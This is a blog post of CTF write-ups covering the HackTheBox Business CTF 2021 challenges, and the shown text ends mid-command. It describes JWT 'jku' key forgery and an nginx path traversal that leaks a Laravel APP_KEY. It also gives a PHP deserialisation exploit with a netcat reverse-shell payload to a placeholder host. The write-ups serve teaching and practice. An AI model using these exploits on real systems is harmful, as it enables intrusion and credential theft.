@@ -1,0 +1,735 @@
+<!doctype html><html lang=en>
+<head>
+<title>
+hackthebox business ctf 2021 writeups ::
+#!/bin/note
+— a checkbox uncheckers notepad
+</title>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta name=description content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost and we managed to score 5th place amongst 374 other teams!
+  The team was composed of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.
+">
+<meta name=keywords content="blog,hack,ctf,leonjza,pentester,red team,attack">
+<meta name=robots content="noodp">
+<link rel=canonical href=https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/>
+<link rel=stylesheet href=https://leonjza.github.io/assets/style.css>
+<link rel=stylesheet href=https://leonjza.github.io/style.css>
+<link rel=apple-touch-icon-precomposed sizes=144x144 href=https://leonjza.github.io/img/apple-touch-icon-144-precomposed.png>
+<link rel="shortcut icon" href=https://leonjza.github.io/img/favicon.png>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Italic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Regular.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Medium.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-MediumItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-Bold.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<link href=https://leonjza.github.io/assets/fonts/Inter-BoldItalic.woff2 rel=preload type=font/woff2 as=font crossorigin>
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content="hackthebox business ctf 2021 writeups">
+<meta name=twitter:description content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost and we managed to score 5th place amongst 374 other teams!
+
+  
+    
+    
+  
+
+
+
+  
+    
+    
+  
+
+
+The team was composed of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.">
+<meta property="og:title" content="hackthebox business ctf 2021 writeups">
+<meta property="og:description" content="The HackTheBox Business CTF 2021 ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost and we managed to score 5th place amongst 374 other teams!
+
+  
+    
+    
+  
+
+
+
+  
+    
+    
+  
+
+
+The team was composed of (those with twitterz!): felmoltor, JCoertze, TH3_GOAT_FARM3R, Titanex8, _cablethief, gav1no_ and GMILTE.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="https://leonjza.github.io/blog/2021/07/26/hackthebox-business-ctf-2021-writeups/"><meta property="article:section" content="posts">
+<meta property="article:published_time" content="2021-07-26T20:19:36+02:00">
+<meta property="article:modified_time" content="2021-07-26T20:19:36+02:00"><meta property="og:site_name" content="#!/bin/note
+">
+</head>
+<body class=dark-theme>
+<div class=container>
+<header class=header>
+<span class=header__inner>
+<a href=/ class=logo style=text-decoration:none>
+<span class=logo__mark><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44"><path fill="none" d="M15 8l14.729 14.382L15 35.367"/></svg>
+</span>
+<span class=logo__text>#!/bin/note
+</span>
+<span class=logo__cursor></span>
+</a>
+<span class=header__right>
+<nav class=menu>
+<ul class="menu__inner menu__inner--desktop">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
+<ul class="menu__inner menu__inner--mobile">
+<li><a href=/about/>About Me</a></li>
+<li><a href=/categories>Categories</a></li>
+<li><a href=/posts>Posts</a></li>
+</ul>
+</nav>
+<span class=menu-trigger><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M0 0h24v24H0z" fill="none"/><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+</span>
+<span class=theme-toggle><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M22 41c10.4934.0 19-8.5066 19-19C41 11.5066 32.4934 3 22 3 11.5066 3 3 11.5066 3 22s8.5066 19 19 19zM7 22C7 13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22z"/></svg>
+</span>
+</span>
+</span>
+</header>
+<div class=content>
+<div class=post>
+<h1 class=post-title>hackthebox business ctf 2021 writeups</h1>
+<div class=post-meta>
+<span class=post-date>
+2021-07-26
+</span>
+<span class=post-read-time>— 18 min read</span>
+</div>
+<figure class=post-cover>
+<img src=https://leonjza.github.io/images/htbbusiness21/htb_business_logo.png alt="hackthebox business ctf 2021 writeups">
+</figure>
+<div class=post-content>
+<h2>Table of Contents</h2>
+<aside class=table-of-contents><nav id=TableOfContents>
+<ul>
+<li><a href=#solutions>solutions</a>
+<ul>
+<li><a href=#webemergency>web/Emergency</a></li>
+<li><a href=#weblarablog>web/Larablog</a></li>
+<li><a href=#forensicsdfir>forensics/DFIR</a></li>
+<li><a href=#cloudkube>cloud/Kube</a></li>
+</ul>
+</li>
+<li><a href=#conclusion>conclusion</a></li>
+</ul>
+</nav></aside>
+<p>The <a href=https://www.hackthebox.eu/htb-business-ctf-2021>HackTheBox Business CTF 2021</a> ran this weekend, and I played with a few colleagues at Orange Cyberdefense / SensePost and we managed to score <a href=https://ctf.hackthebox.eu/ctf/131/scoreboard><em>5th</em></a> place amongst 374 other teams!</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_placement.png>
+</figure>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_graph.png>
+</figure>
+<p>The team was composed of (those with twitterz!): <a href=https://twitter.com/felmoltor>felmoltor</a>, <a href=https://twitter.com/JCoertze>JCoertze</a>, <a href=https://twitter.com/TH3_GOAT_FARM3R>TH3_GOAT_FARM3R</a>, <a href=https://twitter.com/Titanex8>Titanex8</a>, <a href=https://twitter.com/_cablethief>_cablethief</a>, <a href=https://twitter.com/gav1no_>gav1no_</a> and <a href=https://twitter.com/GMILTE>GMILTE</a>.</p>
+<h1 id=solutions>solutions</h1>
+<p>We solved 36 out of the 44 challenges, and in this post I will write up some of the ones I solved and found interesting (and have energy for). Unfortunately there&rsquo;s just too many to write up. Anyways, here goes!</p>
+<h2 id=webemergency>web/Emergency</h2>
+<ul>
+<li>Name: Emergency</li>
+<li>Category: Web</li>
+<li>Solves: 148</li>
+<li>Rating 2/4</li>
+<li>Type: Hosted</li>
+<li>Description: You&rsquo;ve been tasked with a pentesting engagement on a hospital management portal, they&rsquo;ve provided you with a mockup build of the website and they&rsquo;ve asked you to break their JWT implementation and find a way to login as &ldquo;admin&rdquo;.</li>
+</ul>
+<hr>
+<p>Register & login with an account you create.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_emergency_1.png>
+</figure>
+<p>The hint at the top right tells us that if we can login as an admin, we&rsquo;ll see the flag there. Alright. Once logged in, you get a cookie called <code>auth</code> that looks like a JWT. Decoding that JWT in <a href=https://jwt.io/>https://jwt.io/</a> should reveal the contents.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_emergency_2.png>
+</figure>
+<p>The header contains an interesting field called <code>jku</code> (JWK Set URL) <a href=https://datatracker.ietf.org/doc/html/rfc7515#section-4.1.2>rfc7515</a>. While it shows localhost as the host where it&rsquo;s hosted, browsing to <code>/.well-known/jwks.json</code> on the target returns:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;keys&#34;</span>: [
+    {
+      <span style=color:#f92672>&#34;alg&#34;</span>: <span style=color:#e6db74>&#34;RS256&#34;</span>,
+      <span style=color:#f92672>&#34;e&#34;</span>: <span style=color:#e6db74>&#34;65537&#34;</span>,
+      <span style=color:#f92672>&#34;kid&#34;</span>: <span style=color:#e6db74>&#34;520a8c63-979e-4eec-a898-65ce3a745ec8&#34;</span>,
+      <span style=color:#f92672>&#34;kty&#34;</span>: <span style=color:#e6db74>&#34;RSA&#34;</span>,
+      <span style=color:#f92672>&#34;n&#34;</span>: <span style=color:#e6db74>&#34;23449280482738889245895507291078582838254525255910235513541946393154802290847031214392555552806839273748095037249203247472519486345448369548745790075083645659281193865341488345259094202703775414196359389911734542090336466079214752741074523728561352243375122273569387511394908725295341986379516793366924310398799780225643283052845716171900912034770239943764711206765083616511946700338767541895995886704496171585620589055846475443335026466769449848144773605534420418595157593626717750596511024098107708598027318208503613927895670164235148874382087743531049839528965506663562753195462090371169085974069905692817915834823&#34;</span>,
+      <span style=color:#f92672>&#34;use&#34;</span>: <span style=color:#e6db74>&#34;sig&#34;</span>
+    }
+  ]
+}
+</code></pre></div><p>After a little bit of research, the <a href=https://blog.pentesteracademy.com/hacking-jwt-tokens-jku-claim-misuse-2e732109ac1c>following post</a> detailed an attack where you generate a private key pair and self-host a forged JWKS. Cool!</p>
+<p>So, generate a keypair:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>openssl genrsa -out keypair.pem <span style=color:#ae81ff>2048</span>
+openssl rsa -in keypair.pem -pubout -out publickey.crt
+openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
+</code></pre></div><p>Next, copy the generated <code>publickey.crt</code> and <code>pkcs8.key</code> into <a href=https://jwt.io/>https://jwt.io/</a>. This will let you modify the header & payload data fields of the JWT.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_emergency_3.png>
+</figure>
+<p>Next, we will be hosting our own forged <code>jwks.json</code> file somewhere, but with modified values based on the keypair we generated. So, download the existing <code>/.well-known/jwks.json</code> file, and replace the <code>n</code> and <code>e</code> values with those that are printed using the following script:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>from</span> Crypto.PublicKey <span style=color:#f92672>import</span> RSA
+
+fp <span style=color:#f92672>=</span> open(<span style=color:#e6db74>&#34;publickey.crt&#34;</span>, <span style=color:#e6db74>&#34;r&#34;</span>)
+key <span style=color:#f92672>=</span> RSA<span style=color:#f92672>.</span>importKey(fp<span style=color:#f92672>.</span>read())
+fp<span style=color:#f92672>.</span>close()
+
+print(<span style=color:#e6db74>&#34;n:&#34;</span>, key<span style=color:#f92672>.</span>n)
+print(<span style=color:#e6db74>&#34;e:&#34;</span>, key<span style=color:#f92672>.</span>e)
+</code></pre></div><p><em>Note</em>: The script in the writeup mentioned earlier had a call to <code>hex()</code> over <code>key.n</code> and <code>key.e</code>. Our original JWKS had the values represented as base 10 numbers, so I removed the <code>hex()</code> calls.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>❯ python3 get_e_n.py
+n: <span style=color:#ae81ff>22886710563966340956822048238132141776347204676484958377602992744988500635442815278742328990767865767609438546940854465045592221141397954203230579382142347611722813763792672879573215150525919561564482192751114693804214742783873265392598793348692202182691179725882788918622065704479856089306532862072352692898082459694339750406712440593629584995301975643253487813145992707041196851108235248937454814251203885089087347000107501380883928378711572275375692080813223337418307282792929768098893976202646812829106754027981173056002774293629254416025898967630195044941229996683868958839770197444633515843061313215581697151459</span>
+e: <span style=color:#ae81ff>65537</span>
+</code></pre></div><p>Our updated JWKS now looked like this:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+  <span style=color:#f92672>&#34;keys&#34;</span>:[
+  {
+    <span style=color:#f92672>&#34;alg&#34;</span>:<span style=color:#e6db74>&#34;RS256&#34;</span>,
+    <span style=color:#f92672>&#34;e&#34;</span>:<span style=color:#e6db74>&#34;65537&#34;</span>,
+    <span style=color:#f92672>&#34;kid&#34;</span>:<span style=color:#e6db74>&#34;408f6673-30b1-4fa9-aa26-5d68337fa975&#34;</span>,
+    <span style=color:#f92672>&#34;kty&#34;</span>:<span style=color:#e6db74>&#34;RSA&#34;</span>,
+    <span style=color:#f92672>&#34;n&#34;</span>:<span style=color:#e6db74>&#34;22886710563966340956822048238132141776347204676484958377602992744988500635442815278742328990767865767609438546940854465045592221141397954203230579382142347611722813763792672879573215150525919561564482192751114693804214742783873265392598793348692202182691179725882788918622065704479856089306532862072352692898082459694339750406712440593629584995301975643253487813145992707041196851108235248937454814251203885089087347000107501380883928378711572275375692080813223337418307282792929768098893976202646812829106754027981173056002774293629254416025898967630195044941229996683868958839770197444633515843061313215581697151459&#34;</span>,
+    <span style=color:#f92672>&#34;use&#34;</span>:<span style=color:#e6db74>&#34;sig&#34;</span>
+  }
+]}
+</code></pre></div><p>Host this file somewhere on the Internet where the challenge box can find it, update the <code>jku</code> URL in <a href=https://jwt.io/>https://jwt.io/</a> to where you are hosting the JWKS and update the existing cookie value to the new, forged one generated by <a href=https://jwt.io/>https://jwt.io/</a>. Finally, reload the page and voila!</p>
+<p>Flag: <code>HTB{your_JWTS_4r3_cl41m3d!!}</code></p>
+<h2 id=weblarablog>web/Larablog</h2>
+<ul>
+<li>Name: Larablog</li>
+<li>Category: Web</li>
+<li>Solves: 43</li>
+<li>Rating 3/4</li>
+<li>Type: Hosted</li>
+<li>Description: I really like nginx, I also really like Laravel. This is why I published a blog post about my secure boilerplate nginx config on my Laravel deployments.</li>
+</ul>
+<hr>
+<p>The landing page is a &ldquo;blog&rdquo; with one entry where the author speaks about an nginx related configuration.</p>
+<figure class=left>
+<img src=/images/htbbusiness21/htb_larablog_1.png>
+</figure>
+<p>I assumed this was the configuration the server in the challenge had. The nginx configuration file on the page was:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>user www;
+pid /run/nginx.pid;
+error_log /dev/stderr info;
+
+events {
+    worker_connections 1024;
+}
+
+http {
+    server_tokens off;
+    log_format docker &#39;$remote_addr $remote_user $status &#34;$request&#34; &#34;$http_referer&#34; &#34;$http_user_agent&#34; &#39;;
+    access_log /dev/stdout docker;
+
+    charset utf-8;
+    keepalive_timeout 20s;
+    sendfile on;
+    tcp_nopush on;
+    client_max_body_size 2M;
+
+    include  /etc/nginx/mime.types;
+
+    server {
+        listen 80;
+        server_name _;
+
+        index index.php;
+        root /www/public;
+
+        location /assets {
+            alias /www/public/;
+        }
+
+        location / {
+            try_files $uri $uri/ /index.php?$query_string;
+            location ~ \.php$ {
+                try_files $uri =404;
+                fastcgi_pass unix:/run/php-fpm.sock;
+                fastcgi_index index.php;
+                fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
+                include fastcgi_params;
+            }
+        }
+    }
+}
+</code></pre></div><p>The vuln is not too hard to spot. The assets location is missing a trailing slash which results in a path traversal vulnerability.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>        location /assets {
+            alias /www/public/;
+        }
+</code></pre></div><p>Reading <a href="https://blog.detectify.com/2020/11/10/common-nginx-misconfigurations/#:~:text=were%20the%20following%3A-,Off-By-Slash,-server%20%7B%0A%20%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0%C2%A0listen%2080">this post</a>, you can find an excellent description of the &ldquo;Off-By-Slash&rdquo; issue and the path traversal problems this creates. Now, given that this challenge was called &lsquo;Larablog&rsquo;, I assumed it was based on <a href=https://laravel.com/>Laravel</a>. Laravel apps should only have their <a href=https://github.com/laravel/laravel/tree/8.x/public>public</a> directory exposed to the Internet. However, when combined with the nginx misconfiguration we can actually gain access to the configuration file that is typically one folder up in a file called <code>.env</code> with a request to <code>http://host/assets../.env</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ curl http://142.93.38.188:31631/assets../.env
+APP_NAME=blog
+APP_ENV=production
+APP_KEY=base64:BWA2LF8I+Xq72HkNO2sZqnaYcC7qwAevd7zBJoI5iEE=
+APP_DEBUG=true
+APP_URL=http://localhost
+
+...
+</code></pre></div><p>Excellent! The <code>APP_KEY</code> in a Laravel application is used for anything crypto related, which includes session cookies! This application was setting two cookies, one called <code>blog_session</code> and another randomly generated named one:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>blog_session=eyJpdiI6Ikw4NDE5SVNkSWdES2NmWFVYVHNWbnc9PSIsInZhbHVlIjoidStsWHhuOUtIY2FzZjVQUmQ0SlhuMFd5SUZpdHBFRWNXa1FnSGlPdzZZcGNNTFM5XC9GMnpLNGlYNHhSc3pOcEpJWUdTN2NXaW1TdWZPQnJnZllZamNBPT0iLCJtYWMiOiIxMDgyY2EzZWE4ZjU4NjViYjFiMDcyZDAyMjViMWNkOGEwOTY2OWQ2OGY0N2NjOGNkODE3MDQ4MzBlNmNlYmNmIn0%3D;
+
+GblwliF2kVK6ZboaxHD1aJmb9VZ0qmrOvKe7VKtI=eyJpdiI6ImxyYVh3ZGlESjc0Qmd3YVplVExxTUE9PSIsInZhbHVlIjoiWUFpeTh0TjRNOGRDbEFYZ2E5Nm5WeXpDeGNsWkRRVHA5a1FZWmtuR0pkNFBLMVZGTXdPeDdKcWdnNVI5K2l2cFJ4OGxDQTI3NjFEOGVYYkVrTGpSXC9JaEdRYmlYSzFZeGEwRU1RTWQxa05DTzJqMDBJcHRRUUFlY0hYZEpVOW5NM0xxcktyTG5adWlNZ1RNTGlWb2ZadzVCM3pYR1NXc2ppMkUxWXBWUjBCdDVWXC90OFp6ajJ1Z09qdXpVVjMrM0NnQnM3bEVYNnlOSUZZU1BjekJuSmRsSGxjNytzWGh3dHVqSXQ1T0s3YXVMS0FHUzdCSUtxcHNMXC9JWk5iZU5BN2o2Mll3VlJpUkc5bmlhdFhWM3NOblVSVmhBUUdvejF5R0pMV3hvVVJVQ2F5elQxczRGXC94d000VkdicWNzSk4xSkkrQXlJbm1lZnRYUjFZbWpRU291emhCMGluNW95RE01dm9sQ3l6NTdmK1VkM2xqdSszWUNKcGNWV1ZxTnpTZ3NDSXpnMmlDYWNNVGRiVWFHcGREVWJaMWpqRjhJSVNGT1NhUERoVkZBdFwvZjJvMzJhMTEwSnJPUlppK1wvak0xQiIsIm1hYyI6ImVkMmZhZWRlY2Q1YWRhZTIzYWM5OTc4OTAxOGEyM2I5YzhiOWUxMGQ1MzkwNWY5ZTE1ODg3MWVjODU5ZGU0YjIifQ%3D%3D;
+</code></pre></div><p>Because we have the <code>APP_KEY</code>, we can decrypt these cookies. A long time ago I extracted the encryption logic from the Laravel project into a Gist <a href=https://gist.github.com/leonjza/9add68e267f2348a3968a2ac4b86c5ec>here</a>, but for this challenge I found a python implementation I used <a href=https://gist.github.com/bluetechy/5580fab27510906711a2775f3c4f5ce3>here</a>. Updating the values in the script with the current key & cookies, the decrypted values were:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-text data-lang=text>❯ python3 decrypt.py
+blog_session
+b&#39;s:40:&#34;GblwliF2kVK6ZboaxHD1aJmb9VZ0qmrOvKe7VKtI&#34;;\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10&#39;
+
+b&#39;s:324:&#34;{&#34;data&#34;:&#34;a:6:{s:6:\\&#34;_token\\&#34;;s:40:\\&#34;KyD6rt0laS5gC0NY0TezBFwdW86j7s2yP9A7jOFh\\&#34;;s:8:\\&#34;username\\&#34;;s:8:\\&#34;guest22e\\&#34;;s:5:\\&#34;order\\&#34;;s:2:\\&#34;id\\&#34;;s:9:\\&#34;direction\\&#34;;s:4:\\&#34;desc\\&#34;;s:6:\\&#34;_flash\\&#34;;a:2:{s:3:\\&#34;old\\&#34;;a:0:{}s:3:\\&#34;new\\&#34;;a:0:{}}s:9:\\&#34;_previous\\&#34;;a:1:{s:3:\\&#34;url\\&#34;;s:26:\\&#34;http:\\/\\/142.93.38.188:31631\\&#34;;}}&#34;,&#34;expires&#34;:1627336043}&#34;;\x03\x03\x03&#39;
+</code></pre></div><p>So, <code>blog_session</code> contained the name of the cookie with the actual PHP <code>serialized()</code> data in it. Neat :)</p>
+<p>Anyways, some older versions of Laravel suffered from a classic PHP deserialisation attack. A more recent post about abusing that can be found <a href=https://blog.truesec.com/2020/02/12/from-s3-bucket-to-laravel-unserialize-rce/>here</a>, which does a great job at explaining how the vulnerability works. In our case we were running Laravel 5.5.40 which could be enumerated from the <code>composer.json</code> that we could access thanks to the path traversal at <code>http://142.93.38.188:31631/assets../composer.json</code>:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{
+    <span style=color:#f92672>&#34;name&#34;</span>: <span style=color:#e6db74>&#34;laravel/laravel&#34;</span>,
+    <span style=color:#f92672>&#34;description&#34;</span>: <span style=color:#e6db74>&#34;The Laravel Framework.&#34;</span>,
+    <span style=color:#f92672>&#34;keywords&#34;</span>: [<span style=color:#e6db74>&#34;framework&#34;</span>, <span style=color:#e6db74>&#34;laravel&#34;</span>],
+    <span style=color:#f92672>&#34;license&#34;</span>: <span style=color:#e6db74>&#34;MIT&#34;</span>,
+    <span style=color:#f92672>&#34;type&#34;</span>: <span style=color:#e6db74>&#34;project&#34;</span>,
+    <span style=color:#f92672>&#34;require&#34;</span>: {
+        <span style=color:#f92672>&#34;php&#34;</span>: <span style=color:#e6db74>&#34;^7.1.3&#34;</span>,
+        <span style=color:#f92672>&#34;fideloper/proxy&#34;</span>: <span style=color:#e6db74>&#34;^4.0&#34;</span>,
+        <span style=color:#f92672>&#34;laravel/framework&#34;</span>: <span style=color:#e6db74>&#34;5.5.40&#34;</span>,  <span style=color:#960050;background-color:#1e0010>&lt;--</span>
+        <span style=color:#f92672>&#34;laravel/tinker&#34;</span>: <span style=color:#e6db74>&#34;^1.0&#34;</span>
+    },
+
+<span style=color:#960050;background-color:#1e0010>...</span>
+</code></pre></div><p>Knowing that, all we needed was to use the <code>poc.php</code> file from the previous post (with <a href=https://github.com/ambionics/phpggc>phpggc</a> setup in the path as well), and viola:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
+
+$cipher <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;AES-256-CBC&#39;</span>;
+$app_key <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;base64:BWA2LF8I+Xq72HkNO2sZqnaYcC7qwAevd7zBJoI5iEE=&#39;</span>;
+$chain_name <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;Laravel/RCE6&#39;</span>;
+$payload <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;system(\&#39;nc MYHOST-IP 4444 -e /bin/sh\&#39;);&#39;</span>;
+
+<span style=color:#75715e>// Use PHPGGC to generate the gadget chain
+</span><span style=color:#75715e></span>$chain <span style=color:#f92672>=</span> <span style=color:#a6e22e>shell_exec</span>(<span style=color:#e6db74>&#39;./phpggc/phpggc &#39;</span><span style=color:#f92672>.</span>$chain_name<span style=color:#f92672>.</span><span style=color:#e6db74>&#39; &#34;&#39;</span><span style=color:#f92672>.</span>$payload<span style=color:#f92672>.</span><span style=color:#e6db74>&#39;&#34;&#39;</span>);
+<span style=color:#75715e>// Key can be stored as base64 or string.
+</span><span style=color:#75715e></span><span style=color:#66d9ef>if</span>( <span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#34;:&#34;</span>, $app_key)[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>===</span> <span style=color:#e6db74>&#39;base64&#39;</span> ) {
+        $app_key <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_decode</span>(<span style=color:#a6e22e>explode</span>(<span style=color:#e6db74>&#39;:&#39;</span>, $app_key)[<span style=color:#ae81ff>1</span>]);
+}
+
+<span style=color:#75715e>// Create cookie
+</span><span style=color:#75715e></span>$iv <span style=color:#f92672>=</span> <span style=color:#a6e22e>random_bytes</span>(<span style=color:#a6e22e>openssl_cipher_iv_length</span>($cipher));
+$value <span style=color:#f92672>=</span> <span style=color:#a6e22e>\openssl_encrypt</span>($chain, $cipher, $app_key, <span style=color:#ae81ff>0</span>, $iv);
+$iv <span style=color:#f92672>=</span> <span style=color:#a6e22e>base64_encode</span>($iv);
+$mac <span style=color:#f92672>=</span> <span style=color:#a6e22e>hash_hmac</span>(<span style=color:#e6db74>&#39;sha256&#39;</span>, $iv<span style=color:#f92672>.</span>$value, $app_key);
+$json <span style=color:#f92672>=</span> <span style=color:#a6e22e>json_encode</span>(<span style=color:#a6e22e>compact</span>(<span style=color:#e6db74>&#39;iv&#39;</span>, <span style=color:#e6db74>&#39;value&#39;</span>, <span style=color:#e6db74>&#39;mac&#39;</span>));
+
+<span style=color:#75715e>// Print the results
+</span><span style=color:#75715e></span><span style=color:#66d9ef>die</span>(<span style=color:#a6e22e>urlencode</span>(<span style=color:#a6e22e>base64_encode</span>($json)) <span style=color:#f92672>.</span> <span style=color:#a6e22e>PHP_EOL</span>);
+</code></pre></div><p>Running that would generate a cookie such the following:</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>❯ php poc.php
+eyJpdiI6Ijc2cjU4S0VHcmFqUnB5YThZZkM1c2c9PSIsInZhbHVlIjoibU9SM1ZqUTY4d0ZWcVAzWHQyMEEwanVvVW5EdEpRcXpLZnJ4Z1Rrd3piVGgzc2FEWFJyTGhGZDBYM0pDTld6bWtFVHBDNzRWWTBLRVdCMzBXVGxyU1pBVmNkVWZ6NGExR2dUTFM5c2N6Nlwvak9BN3JhT0FxNkhYcGZmU1wvVmllaXNvSmdpUVwvOWVRTnlVR3Nqbk0wNG56ZDBoSGxvdWd5Q1FTZkZNQitFSWpsa29xVWVxTGlqOWYwc2dtcWkySXZ1S1VaMVU2MTJQVkNsdHFBSXpRUnZcL0xDNENZOGZpRkYxOTRPWml0MUJYZCthNVNVemM4MHZmRE1kNzJvSUNDU2V4SXpsWlI1eU5JNlBlWGt4UUdSeHVlaWxWazlZTjQwNlJFSE5ZRmJoRUR5VlRhNXA1cXd0bmVucFlicWRUSU1ja2U5S0Z0OVRJOVRuZHRkenFqMHluejhubEFON1EzTlBmV0pHSG5FbTYrRVB2SFwvWTFtN2xNQU9GcVYwR2FSaHBmQmxTN1pmZmhVU0Jua3plZmE0Ym53QjZYNHNUV284N3lhQ0plbURINXoreitzdllOZlJ3MjVLUzlCOE9GUHJPZFhoY2sxR1ltXC85V0Qwcnl5Uk9KRTNPSTQ5aFh2UHkxbjZlTEpGd25yeFg0T3FhbUpQMWVUZHlKcHQ0cWNYa1hwak93OFE1ZTJ6aEV2ZHNPRnlaWVllYlY4QjVwdW1ZdkdoSDJ2dVJuRlBWWHlBV1wvWHBJbllNQ1dKUlVZdlpIMXFYVzdOWStPZms1U1pEUnFpdXN4VFQreUc5TmpPVnFpbDl3RE1CRTJMYVhycDU3K1FMa0crcVBjVDFJVVZMdXlDQUgrbUFQUndEdnJcLzFyaTBqUlQxZU52K2g5Q2lldzUxUDBZOXRWSnVuU1FHWG9ERklYZUN3UHFUQVpcL0xVaVYyVTdvZlhha1wvaEF4cElHRHRLS0hRcUhRcEl0ZTFCQUN1cUd6dzhkeG5zK0hFV2lSMEV4aE9HTHFXTlpQWExkNiIsIm1hYyI6ImI1NWFlNWM3MDE2MTk3NTgzZGYwNmI3NjUyOWUzNWU2NTBiNmQ5NWZjZWU5ZGNmNjNiNjU0ZDkxODUxMWY5NzIifQ%3D%3D
+</code></pre></div><p>With your netcat listener and a modified request in your burp you should get a shell to cat the flag from! Alternatively, a one liner would look something like this (note the inline execution of <code>$(php poc.php)</code>):</p>
+<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>curl -i -s -k -X <span style=color:#e6db74>$&#39;GET&#39;</span> <span style=color:#ae81ff>\ </span>                                              Py venv3
+    -H <span style=color:#e6db74>$&#39;Host: 142.93.38.188:31631&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Accept-Language: en-US,en;q=0.5&#39;</span> <span style=color:#ae81ff>\
+</span><span style=color:#ae81ff></span>    -H <span style=color:#e6db74>$&#39;Accept-Encoding: gzip, deflate&#39;</span> <span style=color:#ae81ff>\
